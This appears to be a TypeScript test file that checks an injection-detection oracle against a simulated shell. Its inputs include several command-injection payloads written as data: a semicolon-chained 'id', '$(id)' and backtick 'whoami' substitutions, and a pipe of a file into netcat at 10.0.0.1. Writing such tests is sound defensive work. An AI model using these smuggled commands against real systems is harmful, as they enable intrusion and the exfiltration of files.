import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createOracle } from '../lib/oracle.ts'
import { simulateCommand } from '../lib/simshell.ts'

function events(oracle: ReturnType<typeof createOracle>) {
  return oracle.events().filter((e) => e.kind === 'command_injection_simulated')
}

test('benign single command emits no event and is deterministic', () => {
  const oracle = createOracle({ app: 'acme-saas' })
  const a = simulateCommand('echo {0}', ['hello world'], oracle)
  const b = simulateCommand('echo {0}', ['hello world'], oracle)
  assert.equal(a.output, 'hello world\n')
  assert.deepEqual(a, b)
  assert.deepEqual(a.commands, ['echo hello world'])
  assert.equal(events(oracle).length, 0)
})

test('semicolon second command injection emits event', () => {
  const oracle = createOracle({ app: 'acme-saas' })
  const r = simulateCommand('echo {0}', ['hi; id'], oracle)
  assert.equal(events(oracle).length, 1)
  assert.ok(r.commands.includes('id'))
  assert.match(r.output, /uid=1000/)
})

test('command substitution injection emits event', () => {
  const oracle = createOracle({ app: 'acme-saas' })
  simulateCommand('echo {0}', ['$(id)'], oracle)
  simulateCommand('echo {0}', ['`whoami`'], oracle)
  assert.equal(events(oracle).length, 2)
})

test('pipe to an unexpected program emits event', () => {
  const oracle = createOracle({ app: 'acme-saas' })
  const r = simulateCommand('cat {0}', ['file | nc 10.0.0.1 9001'], oracle)
  assert.equal(events(oracle).length, 1)
  assert.ok(r.commands.some((c) => c.startsWith('nc')))
})

test('no oracle passed still returns parsed commands', () => {
  const r = simulateCommand('echo {0}', ['x; id'])
  assert.deepEqual(r.commands, ['echo x', 'id'])
})
